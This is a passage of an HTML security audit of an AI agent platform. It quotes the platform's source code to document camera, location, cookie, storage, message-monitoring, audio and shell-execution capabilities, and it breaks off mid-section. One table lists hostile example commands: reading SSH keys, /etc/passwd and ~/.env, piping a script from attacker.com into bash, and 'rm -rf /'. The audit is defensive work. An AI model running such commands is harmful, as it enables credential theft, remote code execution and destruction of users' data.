      <h3>Misleading UI Feedback</h3>
      <div class="file-path">NodeRuntime.kt (lines 943-955)</div>
      <pre><code>MoltbotCameraCommand.Snap.rawValue -> {
    <span class="function">showCameraHud</span>(message = <span class="string">"Taking photo…"</span>, kind = CameraHudKind.Photo)
    <span class="keyword">val</span> res = camera.<span class="function">snap</span>(paramsJson)
<span class="highlight-line">    <span class="function">showCameraHud</span>(message = <span class="string">"Photo captured"</span>, ...)  <span class="comment">// User sees this</span></span>
<span class="highlight-line">    GatewaySession.InvokeResult.<span class="function">ok</span>(res.payloadJson)  <span class="comment">// Data transmitted without user notification</span></span>
}</code></pre>
      <div class="warning">
        <strong>The user sees "Photo captured" — but is never told the photo was transmitted to the gateway.</strong> The UI implies local capture. The code transmits the data immediately.
      </div>

      <h3>No Audit Trail</h3>
      <div class="file-path">NodeForegroundService.kt (lines 46-54)</div>
      <pre><code><span class="comment">// The foreground notification shows ONLY:</span>
<span class="keyword">val</span> title = <span class="keyword">if</span> (connected) <span class="string">"Moltbot Node · Connected"</span> <span class="keyword">else</span> <span class="string">"Moltbot Node"</span>
<span class="keyword">val</span> text = (server?.<span class="keyword">let</span> { <span class="string">"$status · $it"</span> } ?: status) + voiceSuffix

<span class="comment">// NO indication of:</span>
<span class="comment">// - Individual captures</span>
<span class="comment">// - Data transmissions</span>
<span class="comment">// - What was sent when</span></code></pre>

      <div class="explanation">
        <strong>Summary:</strong> The device shows a persistent "Connected" notification. There is no log, no notification, no indication when a capture occurs or when data is transmitted. The user has no way to know what was captured or when it was sent to the gateway.
      </div>

      <h3>Why Base64 Encoding Matters Here</h3>
      <p>Base64 encoding itself is not exotic — it's a standard data encoding. <strong>What deviates here is the lack of consent, user prompts, secure storage, and encryption:</strong></p>
      <ul>
        <li>Combined with <strong>autonomous AI triggering</strong> — the AI agent decides when to capture, no human operator required</li>
        <li>Combined with <strong>remote triggering</strong> — gateway can initiate captures</li>
        <li>Combined with <strong>background execution</strong> — no consent prompt</li>
        <li>Combined with <strong>immediate transmission</strong> — data sent before user knows</li>
        <li>Combined with <strong>no logging</strong> — no audit trail of what was sent</li>
        <li>Combined with <strong>UI lacks transmission disclosure</strong> — "captured" implies local, not transmitted</li>
      </ul>
      <div class="warning">
        <strong>Note:</strong> Dynamic analysis found the gateway binds to localhost (127.0.0.1) only. Data flows to the local gateway, not to external servers. However, if the gateway were exposed (via port forwarding, Tailscale funnel, or misconfiguration), these capabilities could enable remote monitoring.
      </div>
    </div>
  </div>

  <!-- Section 2b: Browser Session Access -->
  <div class="section" id="browser-access">
    <div class="section-header">
      <span class="num">2b</span>
      Browser Session Access — Cookies & Storage
    </div>
    <div class="section-content">
      <p>Clawdbot includes full browser session access via Playwright/CDP (Chrome DevTools Protocol), enabling access to cookies and localStorage from <strong>any website the user is logged into</strong>:</p>

      <h3>Cookie Extraction</h3>
      <div class="file-path">src/browser/pw-tools-core.storage.ts (lines 3-11)</div>
      <pre><code><span class="keyword">export async function</span> <span class="function">cookiesGetViaPlaywright</span>(opts: {
  cdpUrl: <span class="keyword">string</span>;
  targetId?: <span class="keyword">string</span>;
}): Promise&lt;{ cookies: unknown[] }&gt; {
  <span class="keyword">const</span> page = <span class="keyword">await</span> <span class="function">getPageForTargetId</span>(opts);
  <span class="function">ensurePageState</span>(page);
<span class="highlight-line">  <span class="keyword">const</span> cookies = <span class="keyword">await</span> page.<span class="function">context</span>().<span class="function">cookies</span>();  <span class="comment">// ALL cookies from ALL sites</span></span>
  <span class="keyword">return</span> { cookies };
}</code></pre>

      <h3>localStorage/sessionStorage Theft</h3>
      <div class="file-path">src/browser/pw-tools-core.storage.ts (lines 57-86)</div>
      <pre><code><span class="keyword">export async function</span> <span class="function">storageGetViaPlaywright</span>(opts: {
  cdpUrl: <span class="keyword">string</span>;
  targetId?: <span class="keyword">string</span>;
  kind: <span class="string">"local"</span> | <span class="string">"session"</span>;
  key?: <span class="keyword">string</span>;
}): Promise&lt;{ values: Record&lt;<span class="keyword">string</span>, <span class="keyword">string</span>&gt; }&gt; {
  <span class="keyword">const</span> page = <span class="keyword">await</span> <span class="function">getPageForTargetId</span>(opts);
  <span class="keyword">const</span> values = <span class="keyword">await</span> page.<span class="function">evaluate</span>(({ kind }) => {
<span class="highlight-line">    <span class="keyword">const</span> store = kind === <span class="string">"session"</span> ? window.sessionStorage : window.localStorage;</span>
    <span class="keyword">const</span> out = {};
<span class="highlight-line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = 0; i &lt; store.length; i++) {  <span class="comment">// Dumps ALL keys</span></span>
      <span class="keyword">const</span> k = store.<span class="function">key</span>(i);
      <span class="keyword">if</span> (k) out[k] = store.<span class="function">getItem</span>(k);
    }
    <span class="keyword">return</span> out;
  }, { kind });
}</code></pre>

      <h3>CLI Commands for Cookie/Storage Access</h3>
      <div class="file-path">src/cli/browser-cli-state.cookies-storage.ts</div>
      <pre><code><span class="comment">// Available commands:</span>
cookies                 <span class="comment">// Get all browser cookies</span>
cookies set &lt;name&gt; &lt;value&gt; --url &lt;url&gt;  <span class="comment">// Inject cookies</span>
cookies clear           <span class="comment">// Clear all cookies</span>
storage local get       <span class="comment">// Get all localStorage</span>
storage session get     <span class="comment">// Get all sessionStorage</span></code></pre>

      <div class="warning">
        <strong>Session Hijacking Potential:</strong>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li><strong>Banking sites</strong> — session cookies enable account access</li>
          <li><strong>Email</strong> — Gmail, Outlook tokens can be stolen</li>
          <li><strong>Social media</strong> — Facebook, Twitter, LinkedIn sessions</li>
          <li><strong>Corporate apps</strong> — SSO tokens, internal tool access</li>
          <li><strong>Crypto exchanges</strong> — API keys often stored in localStorage</li>
        </ul>
        <p style="margin-top: 12px;">Any site the user has visited can have its session tokens extracted and used elsewhere.</p>
      </div>
    </div>
  </div>

  <!-- Section 2c: Remote Command Execution -->
  <div class="section" id="remote-exec">
    <div class="section-header">
      <span class="num">2c</span>
      Remote Command Execution — Arbitrary Shell Access
    </div>
    <div class="section-content">
      <p>The <code>nodes</code> tool includes a <code>system.run</code> command that executes <strong>arbitrary shell commands</strong> on any paired device:</p>

      <div class="file-path">src/agents/tools/nodes-tool.ts (lines 388-441)</div>
      <pre><code><span class="keyword">case</span> <span class="string">"run"</span>: {
  <span class="keyword">const</span> node = <span class="function">readStringParam</span>(params, <span class="string">"node"</span>, { required: <span class="keyword">true</span> });
  <span class="comment">// ...</span>
  <span class="keyword">const</span> commandRaw = params.command;
<span class="highlight-line">  <span class="keyword">if</span> (!Array.<span class="function">isArray</span>(commandRaw)) {</span>
<span class="highlight-line">    <span class="keyword">throw new</span> Error(<span class="string">"command must be an array of strings (argv)"</span>);</span>
<span class="highlight-line">  }</span>
  <span class="keyword">const</span> command = commandRaw.<span class="function">map</span>((c) => String(c));
  <span class="keyword">const</span> cwd = params.cwd;  <span class="comment">// Working directory</span>
  <span class="keyword">const</span> env = <span class="function">parseEnvPairs</span>(params.env);  <span class="comment">// Environment variables</span>

<span class="highlight-line">  <span class="keyword">const</span> raw = <span class="keyword">await</span> <span class="function">callGatewayTool</span>(<span class="string">"node.invoke"</span>, gatewayOpts, {</span>
<span class="highlight-line">    nodeId,</span>
<span class="highlight-line">    command: <span class="string">"system.run"</span>,  <span class="comment">// Executes any command</span></span>
<span class="highlight-line">    params: { command, cwd, env, ... },</span>
<span class="highlight-line">  });</span>
}</code></pre>

      <h3>What This Enables</h3>
      <table>
        <tr>
          <th>Command Example</th>
          <th>Impact</th>
        </tr>
        <tr>
          <td><code>["cat", "/etc/passwd"]</code></td>
          <td>Read system files</td>
        </tr>
        <tr>
          <td><code>["cat", "~/.ssh/id_rsa"]</code></td>
          <td>Steal SSH private keys</td>
        </tr>
        <tr>
          <td><code>["cat", "~/.env"]</code></td>
          <td>Steal environment secrets</td>
        </tr>
        <tr>
          <td><code>["curl", "http://attacker.com/shell.sh", "|", "bash"]</code></td>
          <td>Download and execute untrusted software</td>
        </tr>
        <tr>
          <td><code>["rm", "-rf", "/"]</code></td>
          <td>Destructive commands</td>
        </tr>
      </table>

      <div class="warning">
        <strong>This enables remote command execution on paired devices.</strong> However, dynamic analysis found the gateway binds to localhost only — remote access requires explicit pairing on the local network. This is not an externally reachable remote-access tool with public C2; the capability exists for LAN-based remote control of paired devices.
      </div>

      <h3>Complete Node Command Surface</h3>
      <p>The remote execution capability extends far beyond <code>system.run</code>. The <code>node-command-policy.ts</code> file reveals the <strong>complete list of commands</strong> that can be invoked on any connected device:</p>

      <div class="file-path">src/gateway/node-command-policy.ts (lines 4-57)</div>
      <pre><code><span class="comment">// Canvas Commands</span>
<span class="keyword">const</span> CANVAS_COMMANDS = [
  <span class="string">"canvas.present"</span>, <span class="string">"canvas.hide"</span>, <span class="string">"canvas.navigate"</span>,
<span class="highlight-line">  <span class="string">"canvas.eval"</span>,  <span class="comment">// Execute arbitrary JavaScript!</span></span>
  <span class="string">"canvas.snapshot"</span>, <span class="string">"canvas.a2ui.push"</span>, ...
];

<span class="comment">// Camera Commands</span>
<span class="keyword">const</span> CAMERA_COMMANDS = [<span class="string">"camera.list"</span>, <span class="string">"camera.snap"</span>, <span class="string">"camera.clip"</span>];

<span class="comment">// Screen Commands</span>
<span class="keyword">const</span> SCREEN_COMMANDS = [<span class="string">"screen.record"</span>];

<span class="comment">// Location Commands</span>
<span class="keyword">const</span> LOCATION_COMMANDS = [<span class="string">"location.get"</span>];

<span class="comment">// SMS Commands (Android only)</span>
<span class="keyword">const</span> SMS_COMMANDS = [<span class="string">"sms.send"</span>];

<span class="comment">// System Commands</span>
<span class="keyword">const</span> SYSTEM_COMMANDS = [
<span class="highlight-line">  <span class="string">"system.run"</span>,  <span class="comment">// Arbitrary shell execution</span></span>
  <span class="string">"system.which"</span>, <span class="string">"system.notify"</span>,
  <span class="string">"system.execApprovals.get"</span>, <span class="string">"system.execApprovals.set"</span>,
<span class="highlight-line">  <span class="string">"browser.proxy"</span>,  <span class="comment">// Browser automation proxy</span></span>
];</code></pre>

      <h4>Platform Command Matrix</h4>
      <table>
        <tr>
          <th>Platform</th>
          <th>Remote Commands Available</th>
        </tr>
        <tr>
          <td><strong>macOS</strong></td>
          <td>Canvas, Camera, Screen, Location, <span class="tag tag-red">Shell Execution</span>, Browser Proxy</td>
        </tr>
        <tr>
          <td><strong>iOS</strong></td>
          <td>Canvas, Camera, Screen, Location</td>
        </tr>
        <tr>
          <td><strong>Android</strong></td>
          <td>Canvas, Camera, Screen, Location, <span class="tag tag-red">SMS Sending</span></td>
        </tr>
        <tr>
          <td><strong>Linux/Windows</strong></td>
          <td><span class="tag tag-red">Shell Execution</span>, Browser Proxy</td>
        </tr>
      </table>

      <div class="warning">
        <strong>This is not a simple automation tool.</strong> The node command surface enables: arbitrary shell command execution, camera monitoring, screen recording, GPS tracking, SMS sending, and remote JavaScript execution. This is a comprehensive remote access framework.
      </div>

      <h3>GPS Location Tracking</h3>
      <p>The same <code>nodes</code> tool also includes location tracking:</p>
      <div class="file-path">src/agents/tools/nodes-tool.ts (lines 358-386)</div>
      <pre><code><span class="keyword">case</span> <span class="string">"location_get"</span>: {
  <span class="keyword">const</span> node = <span class="function">readStringParam</span>(params, <span class="string">"node"</span>, { required: <span class="keyword">true</span> });
  <span class="keyword">const</span> nodeId = <span class="keyword">await</span> <span class="function">resolveNodeId</span>(gatewayOpts, node);
  <span class="keyword">const</span> desiredAccuracy = params.desiredAccuracy;  <span class="comment">// coarse | balanced | precise</span>

<span class="highlight-line">  <span class="keyword">const</span> raw = <span class="keyword">await</span> <span class="function">callGatewayTool</span>(<span class="string">"node.invoke"</span>, gatewayOpts, {</span>
<span class="highlight-line">    nodeId,</span>
<span class="highlight-line">    command: <span class="string">"location.get"</span>,  <span class="comment">// Gets GPS coordinates</span></span>
<span class="highlight-line">    params: { maxAgeMs, desiredAccuracy, timeoutMs },</span>
<span class="highlight-line">  });</span>
}</code></pre>

      <h3>Android Location Capture & Transmission</h3>
      <div class="file-path">apps/android/.../LocationCaptureManager.kt (lines 45-61) — JSON payload construction</div>
      <pre><code>Payload(
  buildString {
    append(<span class="string">"{\"lat\":"</span>)
    append(location.latitude)
    append(<span class="string">",\"lon\":"</span>)
    append(location.longitude)
    append(<span class="string">",\"accuracyMeters\":"</span>)
    append(location.accuracy)
<span class="highlight-line">    <span class="comment">// Also includes: altitudeMeters, speedMps, headingDeg, timestamp</span></span>
    append(<span class="string">'}'</span>)
  }
)</code></pre>

      <div class="file-path">apps/android/.../NodeRuntime.kt (line 1018) — Transmission to gateway</div>
      <pre><code><span class="keyword">val</span> payload = location.<span class="function">getLocation</span>(providers, maxAgeMs, timeoutMs, isPrecise)
<span class="highlight-line">GatewaySession.InvokeResult.<span class="function">ok</span>(payload.payloadJson)  <span class="comment">// Sent via WebSocket to gateway</span></span></code></pre>

      <h3>iOS Location Capture & Transmission — Same Pattern</h3>
      <div class="file-path">apps/ios/Sources/Model/NodeAppModel.swift (lines 612-623) — Payload construction</div>
      <pre><code><span class="keyword">let</span> payload = MoltbotLocationPayload(
    lat: location.coordinate.latitude,
    lon: location.coordinate.longitude,
    accuracyMeters: location.horizontalAccuracy,
    altitudeMeters: location.altitude,
    speedMps: location.speed,
    headingDeg: location.course,
    timestamp: ISO8601DateFormatter().<span class="function">string</span>(from: location.timestamp),
    isPrecise: isPrecise)
<span class="keyword">let</span> json = <span class="keyword">try</span> Self.<span class="function">encodePayload</span>(payload)
<span class="highlight-line"><span class="keyword">return</span> BridgeInvokeResponse(id: req.id, ok: <span class="keyword">true</span>, payloadJSON: json)</span></code></pre>

      <div class="file-path">apps/shared/MoltbotKit/.../GatewayNodeSession.swift (line 227) — WebSocket transmission</div>
      <pre><code><span class="keyword">private func</span> <span class="function">sendInvokeResult</span>(...) <span class="keyword">async</span> {
    <span class="comment">// params contains: id, nodeId, ok, payloadJSON (with lat/lon/etc)</span>
<span class="highlight-line">    <span class="keyword">try await</span> channel.<span class="function">send</span>(method: <span class="string">"node.invoke.result"</span>, params: params)</span>
}</code></pre>

      <div class="explanation">
        <strong>Cross-platform verification:</strong> Both iOS and Android use identical transmission — the <code>node.invoke.result</code> event sent over WebSocket to the gateway. The location payload (lat, lon, altitude, speed, heading, timestamp) leaves the device on both platforms.
      </div>

      <div class="warning">
        <strong>Pattern-of-Life Assessment:</strong> Location data follows the same egress path as camera/screen data — packaged as JSON, returned via <code>InvokeResult.ok()</code>, and transmitted over WebSocket to the gateway with no user notification. Over time, this can build a detailed profile of movement patterns (home/work locations, routines, frequented locations, travel). This supports pattern-of-life assessment in security risk analysis.
        <p style="margin-top: 12px;">Combined with camera captures, screen recordings, and message monitoring, this can enable broad physical and digital monitoring of the target.</p>
      </div>
    </div>
  </div>

  <!-- Section 3: Message Monitoring -->
  <div class="section" id="messages">
    <div class="section-header">
      <span class="num">3</span>
      Message Monitoring (31 Platforms)
    </div>
    <div class="section-content">
      <table>
        <tr>
          <th>Platform</th>
          <th>Implementation</th>
          <th>Capability</th>
        </tr>
        <tr>
          <td>WhatsApp</td>
          <td>Baileys library</td>
          <td>Full message monitoring, media download</td>
        </tr>
        <tr>
          <td>iMessage/SMS</td>
          <td>BlueBubbles integration</td>
          <td>All Apple messages captured</td>
        </tr>
        <tr>
          <td>Signal</td>
          <td><code>src/signal/monitor.ts</code></td>
          <td>"Secure" messages captured</td>
        </tr>
        <tr>
          <td>Telegram</td>
          <td><code>src/telegram/monitor.ts</code></td>
          <td>Bot + message monitoring</td>
        </tr>
        <tr>
          <td>Discord/Slack</td>
          <td>Various integrations</td>
          <td>Workspace messages</td>
        </tr>
      </table>

      <h3>WhatsApp</h3>
      <div class="file-path">src/web/inbound/monitor.ts</div>
      <pre><code><span class="function">monitorWebInbox</span>({
  onMessage: (msg: WebInboundMessage) => Promise&lt;void&gt;,
  sendReadReceipts?: <span class="keyword">boolean</span>,
  mediaMaxMb?: <span class="keyword">number</span>,
})</code></pre>

      <h3>iMessage</h3>
      <div class="file-path">src/imessage/monitor/monitor-provider.ts (line 109)</div>
      <pre><code><span class="keyword">export async function</span> <span class="function">monitorIMessageProvider</span>(
  opts: MonitorIMessageOpts = {}
): Promise&lt;<span class="keyword">void</span>&gt;</code></pre>
      <p style="font-size: 13px; color: #8b949e; margin-top: 8px;">Subscribes via <code>watch.subscribe</code> (line 471). Messages handled via <code>handleMessage()</code> (line 445).</p>

      <h3>Signal</h3>
      <div class="file-path">src/signal/monitor.ts (line 252)</div>
      <pre><code><span class="keyword">export async function</span> <span class="function">monitorSignalProvider</span>(
  opts: MonitorSignalOpts = {}
): Promise&lt;<span class="keyword">void</span>&gt;</code></pre>
      <p style="font-size: 13px; color: #8b949e; margin-top: 8px;">Runs SSE loop (line 299) to listen for server-sent events.</p>

      <h3>Telegram</h3>
      <div class="file-path">src/telegram/monitor.ts (line 70)</div>
      <pre><code><span class="keyword">export async function</span> <span class="function">monitorTelegramProvider</span>(
  opts: MonitorTelegramOpts = {}
)</code></pre>
      <p style="font-size: 13px; color: #8b949e; margin-top: 8px;">Long-polling mechanism for receiving Telegram updates.</p>

      <h3>BlueBubbles (iMessage/SMS bridge)</h3>
      <div class="file-path">extensions/bluebubbles/src/monitor.ts (line 2244)</div>
      <pre><code><span class="keyword">export async function</span> <span class="function">monitorBlueBubblesProvider</span>(
  options: BlueBubblesMonitorOptions,
): Promise&lt;<span class="keyword">void</span>&gt;</code></pre>
      <p style="font-size: 13px; color: #8b949e; margin-top: 8px;">Registers webhook target (line 2273) for incoming events.</p>

      <div class="explanation" style="margin-top: 16px;">Each platform has a dedicated monitoring function in the repository. Function signatures and line numbers verified against public source code.</div>
    </div>
  </div>

  <!-- Section 3b: Ambient Audio Listening -->
  <div class="section" id="ambient-audio">
    <div class="section-header">
      <span class="num">3b</span>
      Ambient Audio Listening — Transcript Storage (macOS)
    </div>
    <div class="section-content">
      <p>The <strong>Swabble</strong> component is an "always-on voice hook daemon" that continuously listens via microphone and <strong>stores transcripts to disk</strong>:</p>

      <div class="file-path">Swabble/Sources/SwabbleCore/Speech/SpeechPipeline.swift (lines 52-59) — Continuous mic tap</div>
      <pre><code><span class="keyword">let</span> inputNode = engine.inputNode
<span class="keyword">let</span> inputFormat = inputNode.<span class="function">outputFormat</span>(forBus: 0)
inputNode.<span class="function">removeTap</span>(onBus: 0)
<span class="highlight-line">inputNode.<span class="function">installTap</span>(onBus: 0, bufferSize: 2048, format: inputFormat) { [weak self] buffer, _ in</span>
<span class="highlight-line">    <span class="keyword">guard let</span> self <span class="keyword">else</span> { <span class="keyword">return</span> }</span>
<span class="highlight-line">    <span class="keyword">let</span> boxed = UnsafeBuffer(buffer: buffer)</span>
<span class="highlight-line">    Task { <span class="keyword">await</span> self.<span class="function">handleBuffer</span>(boxed.buffer, targetFormat: analyzerFormat) }</span>
}</code></pre>

      <div class="file-path">Swabble/README.md (line 86) — Transcripts persisted to disk</div>
      <pre><code><span class="comment">// Config default:</span>
"transcripts": {"enabled": <span class="keyword">true</span>, "maxEntries": 50}

<span class="highlight-line"><span class="comment">// Storage location:</span></span>
<span class="highlight-line">~/Library/Application Support/swabble/transcripts.log</span></code></pre>

      <div class="file-path">Swabble/docs/spec.md (line 3) — Self-described as "always-on"</div>
      <pre><code><span class="highlight-line">"brabble-style <strong>always-on voice hook</strong> for macOS 26 using Apple Speech.framework"</span></code></pre>

      <div class="warning">
        <strong>This is ambient listening with persistent storage:</strong>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>Microphone continuously tapped via <code>AVAudioEngine.installTap()</code></li>
          <li>Audio transcribed via Apple Speech.framework (on-device)</li>
          <li>Transcripts <strong>stored to disk</strong> (up to 50 entries by default)</li>
          <li>Stored transcripts can be read via <code>system.run</code> and exfiltrated</li>
          <li>User may not realize their conversations are being recorded and stored</li>
        </ul>
      </div>
    </div>
  </div>

  <!-- Section 3c: macOS Deep System Access -->
  <div class="section" id="macos-system">
    <div class="section-header">
      <span class="num">3c</span>
      macOS Deep System Access — Accessibility & Automation
    </div>
    <div class="section-content">
      <p>The macOS app requests extensive system permissions that provide deep control over the entire system:</p>

      <h3>Accessibility API — Full UI Control</h3>
      <div class="file-path">apps/macos/Sources/Moltbot/PermissionManager.swift (lines 85-94)</div>
      <pre><code><span class="keyword">private static func</span> <span class="function">ensureAccessibility</span>(interactive: Bool) <span class="keyword">async</span> -> Bool {
<span class="highlight-line">    <span class="keyword">let</span> trusted = <span class="keyword">await</span> MainActor.run { <span class="function">AXIsProcessTrusted</span>() }</span>
    <span class="keyword">if</span> interactive, !trusted {
        <span class="keyword">await</span> MainActor.run {
            <span class="keyword">let</span> opts: NSDictionary = [<span class="string">"AXTrustedCheckOptionPrompt"</span>: <span class="keyword">true</span>]
<span class="highlight-line">            _ = <span class="function">AXIsProcessTrustedWithOptions</span>(opts)</span>
        }
    }
    <span class="keyword">return await</span> MainActor.run { <span class="function">AXIsProcessTrusted</span>() }
}</code></pre>

      <h3>AppleScript/Automation — Control Any App</h3>
      <div class="file-path">apps/macos/Sources/Moltbot/Resources/Info.plist (line 61)</div>
      <pre><code>&lt;key&gt;NSAppleEventsUsageDescription&lt;/key&gt;
<span class="highlight-line">&lt;string&gt;Moltbot needs Automation (AppleScript) permission to <strong>drive Terminal and other apps</strong> for agent actions.&lt;/string&gt;</span></code></pre>

      <div class="file-path">apps/macos/Sources/Moltbot/PermissionManager.swift (lines 381-389) — AppleScript execution</div>
      <pre><code><span class="keyword">let</span> script = <span class="string">"""
tell application "Terminal"
    return "moltbot-ok"
end tell
"""</span>

<span class="keyword">var</span> error: NSDictionary?
<span class="highlight-line"><span class="keyword">let</span> appleScript = <span class="function">NSAppleScript</span>(source: script)</span>
<span class="highlight-line"><span class="keyword">let</span> result = appleScript?.<span class="function">executeAndReturnError</span>(&error)</span></code></pre>

      <h3>All macOS Permissions Requested</h3>
      <div class="file-path">apps/macos/Sources/MoltbotIPC/IPC.swift (lines 6-12)</div>
      <pre><code><span class="keyword">public enum</span> Capability: String, Codable, CaseIterable, Sendable {
<span class="highlight-line">    <span class="keyword">case</span> appleScript      <span class="comment">// Control any app via AppleScript</span></span>
    <span class="keyword">case</span> notifications
<span class="highlight-line">    <span class="keyword">case</span> accessibility    <span class="comment">// Read/control any window via Accessibility API</span></span>
<span class="highlight-line">    <span class="keyword">case</span> screenRecording  <span class="comment">// Capture screen content</span></span>
<span class="highlight-line">    <span class="keyword">case</span> microphone       <span class="comment">// Record audio</span></span>
<span class="highlight-line">    <span class="keyword">case</span> speechRecognition <span class="comment">// Transcribe speech</span></span>
}</code></pre>

      <div class="warning">
        <strong>Accessibility + AppleScript = Total System Control:</strong>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li><strong>Accessibility API</strong> can read text from any window, click any button, control any UI element</li>
          <li><strong>AppleScript</strong> can send commands to any scriptable application</li>
          <li>Combined: Can read password managers, control banking apps, access any application data</li>
          <li>These are the same permissions used by legitimate assistive tools — and by software seeking similar privileges for automation or misuse</li>
        </ul>
      </div>
    </div>
  </div>

  <!-- Section 3d: Browser Screenshots -->
  <div class="section" id="browser-screenshots">
    <div class="section-header">
      <span class="num">3d</span>
      Browser Page Screenshots — Visual Capture of Any Webpage
    </div>
    <div class="section-content">
      <p>Beyond cookies and storage, Clawdbot can take <strong>full screenshots of any webpage</strong> via Playwright/CDP:</p>

      <div class="file-path">src/browser/pw-tools-core.interactions.ts (lines 334-362)</div>
      <pre><code><span class="keyword">export async function</span> <span class="function">takeScreenshotViaPlaywright</span>(opts: {
  cdpUrl: <span class="keyword">string</span>;
  targetId?: <span class="keyword">string</span>;
  ref?: <span class="keyword">string</span>;
  element?: <span class="keyword">string</span>;
  fullPage?: <span class="keyword">boolean</span>;
  type?: <span class="string">"png"</span> | <span class="string">"jpeg"</span>;
}): Promise&lt;{ buffer: Buffer }&gt; {
  <span class="keyword">const</span> page = <span class="keyword">await</span> <span class="function">getPageForTargetId</span>(opts);
  <span class="comment">// ... element/ref selection logic ...</span>
<span class="highlight-line">  <span class="keyword">const</span> buffer = <span class="keyword">await</span> page.<span class="function">screenshot</span>({</span>
<span class="highlight-line">    type,</span>
<span class="highlight-line">    fullPage: Boolean(opts.fullPage),</span>
<span class="highlight-line">  });</span>
  <span class="keyword">return</span> { buffer };
}</code></pre>

      <div class="file-path">src/browser/cdp.ts (lines 38-70) — Direct CDP screenshot capture</div>
      <pre><code><span class="keyword">export async function</span> <span class="function">captureScreenshot</span>(opts: {
  wsUrl: <span class="keyword">string</span>;
  fullPage?: <span class="keyword">boolean</span>;
  format?: <span class="string">"png"</span> | <span class="string">"jpeg"</span>;
  quality?: <span class="keyword">number</span>;
}): Promise&lt;Buffer&gt; {
  <span class="comment">// ...</span>
<span class="highlight-line">  <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="function">send</span>(<span class="string">"Page.captureScreenshot"</span>, {</span>
    format,
    fromSurface: <span class="keyword">true</span>,
    captureBeyondViewport: <span class="keyword">true</span>,
  });
}</code></pre>

      <div class="warning">
        <strong>Can screenshot any page in your browser:</strong>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>Banking websites with account balances</li>
          <li>Email with message content</li>
          <li>Medical portals with health information</li>
          <li>Corporate dashboards with sensitive data</li>
          <li>Password managers (if web-based like 1Password)</li>
        </ul>
        <p style="margin-top: 12px;">Screenshots can be up to 5MB (src/browser/screenshot.ts:4) and transmitted via the same WebSocket channel as other captured data.</p>
      </div>
    </div>
  </div>

  <!-- Section 3e: Local Data Retention -->
  <div class="section" id="local-storage">
    <div class="section-header">
      <span class="num">3e</span>
      Local Data Retention — Everything Stored for Later Access
    </div>
    <div class="section-content">
      <p>Clawdbot stores extensive data locally. While dynamic analysis found no automatic external exfiltration, this data could be accessed via <code>system.run</code> on paired devices:</p>

      <h3>Data Storage Locations</h3>
      <table>
        <tr>
          <th>Data Type</th>
          <th>Storage Path</th>
          <th>Source Reference</th>
        </tr>
        <tr>
          <td>Session transcripts</td>
          <td><code>~/.clawdbot/sessions/*.jsonl</code></td>
          <td>src/gateway/session-utils.fs.ts:50</td>
        </tr>
        <tr>
          <td>Captured media</td>
          <td><code>~/.clawdbot/media/inbound/</code></td>
          <td>src/auto-reply/reply.triggers:27</td>
        </tr>
        <tr>
          <td>Agent data</td>
          <td><code>~/.clawdbot/agents/</code></td>
          <td>Multiple test files</td>
        </tr>
        <tr>
          <td>Extensions</td>
          <td><code>~/.clawdbot/extensions/</code></td>
          <td>src/plugins/install.ts:91</td>
        </tr>
        <tr>
          <td>Voice transcripts</td>
          <td><code>~/Library/Application Support/swabble/transcripts.log</code></td>
          <td>Swabble/README.md:86</td>
        </tr>
        <tr>
          <td>VoiceWake settings</td>
          <td><code>~/.clawdbot/settings/voicewake.json</code></td>
          <td>src/gateway/server.models-voicewake-misc.e2e.test.ts:174</td>
        </tr>
      </table>

      <div class="file-path">src/auto-reply/status.ts (line 172) — Confirms transcript storage</div>
      <pre><code><span class="comment">// Transcripts are stored at the session file path</span>
<span class="highlight-line"><span class="comment">// (fallback: ~/.clawdbot/sessions/&lt;SessionId&gt;.jsonl)</span></span></code></pre>

      <h3>31 Messaging Platform Extensions</h3>
      <p>The <code>extensions/</code> directory contains dedicated integrations for 31 messaging platforms:</p>
      <div class="explanation" style="margin-top: 12px; font-family: monospace; font-size: 13px;">
        bluebubbles, copilot-proxy, diagnostics-otel, discord, google-antigravity-auth, google-gemini-cli-auth, googlechat, imessage, line, llm-task, lobster, matrix, mattermost, memory-core, memory-lancedb, msteams, nextcloud-talk, nostr, open-prose, qwen-portal-auth, signal, slack, telegram, tlon, twitch, voice-call, whatsapp, zalo, zalouser
      </div>

      <div class="explanation">
        <strong>Local storage + system.run = Potential data access on paired devices:</strong>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li><code>system.run</code> can <code>cat</code> any of these files on paired devices</li>
          <li>Session transcripts contain full conversation history</li>
          <li>Voice transcripts contain audio recordings</li>
          <li>Media directory contains captured images/video</li>
        </ul>
        <p style="margin-top: 8px;"><em>Note: Dynamic analysis found no automatic external exfiltration. Gateway binds to localhost only.</em></p>
      </div>
    </div>
  </div>

  <!-- Section 3f: Remote Code Installation -->
  <div class="section" id="remote-code">
    <div class="section-header">
      <span class="num">3f</span>
      Remote Code Installation — Gateway Can Install Arbitrary Software
    </div>
    <div class="section-content">
      <p>The gateway exposes a <code>skills.install</code> method that can <strong>remotely install and execute arbitrary code</strong> on any connected device:</p>

      <div class="file-path">src/gateway/server-methods/skills.ts (lines 100-131)</div>
      <pre><code><span class="highlight-line"><span class="string">"skills.install"</span>: <span class="keyword">async</span> ({ params, respond }) => {</span>
  <span class="keyword">const</span> p = params <span class="keyword">as</span> {
    name: <span class="variable">string</span>;
    installId: <span class="variable">string</span>;
    timeoutMs?: <span class="variable">number</span>;
  };
  <span class="keyword">const</span> cfg = <span class="function">loadConfig</span>();
  <span class="keyword">const</span> workspaceDirRaw = <span class="function">resolveAgentWorkspaceDir</span>(cfg, ...);
<span class="highlight-line">  <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="function">installSkill</span>({</span>
<span class="highlight-line">    workspaceDir: workspaceDirRaw,</span>
<span class="highlight-line">    skillName: p.name,  <span class="comment">// Arbitrary package name</span></span>
<span class="highlight-line">    installId: p.installId,</span>
<span class="highlight-line">  });</span>
}</code></pre>

      <h3>Installation Methods Supported</h3>
      <div class="file-path">src/agents/skills-install.ts (lines 84-128)</div>
      <pre><code><span class="keyword">function</span> <span class="function">buildInstallCommand</span>(spec, prefs) {
  <span class="keyword">switch</span> (spec.kind) {
